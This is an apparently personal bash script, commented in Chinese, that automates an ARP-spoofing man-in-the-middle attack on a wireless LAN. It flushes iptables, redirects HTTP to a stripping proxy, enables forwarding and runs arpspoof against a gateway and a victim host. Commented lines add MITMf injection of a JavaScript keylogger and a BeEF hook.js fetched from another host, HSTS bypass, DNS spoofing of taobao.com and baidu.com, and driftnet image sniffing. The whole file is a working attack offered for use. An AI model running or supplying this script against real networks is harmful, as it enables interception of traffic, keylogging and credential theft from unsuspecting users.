#！ /bin/bash
#arp欺骗，充当中间人
#清空iptables表
iptables -F FORWARD &&
iptables -t nat -F &&
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 2

#arp欺骗，充当中间人
gnome-terminal -x bash -c "arpspoof -i wlan0 -t 192.168.0.1 192.168.1.103"
gnome-terminal -x bash -c "arpspoof -i wlan0 -t 192.168.0.103 192.168.0.1"
sleep 3
#mitmf -i wlan0 --jskeylogger --hsts --screen
#gnome-terminal -x bash -c "mitmf -i wlan0 --inject --html-url http://192.168.1.102:3000/demos/basic.html "
#gnome-terminal -x bash -c "mitmf.py -i wlan0 --replace --search-str aaaaa  --replace-str bbbbb"
#gnome-terminal -x bash -c "mitmf.py -i wlan0 --inject --js-url http://host:3000/hook.js --jskeylogger"

#dns劫持
#ettercap -T -q -i wlan0 -P dns_spoof
#gnome-terminal -x bash -c "dnschef --fakedomains=taobao.com,baidu.com --fakeip=欺骗到dns服务器 -i dns服务器 --nameserver 114.114.114.114"

#嗅探图片
#gnome-terminal -x bash -c "driftnet -i wlan0"
#保存图片
#gnome-terminal -x bash -c "driftnet -i wlan -a"
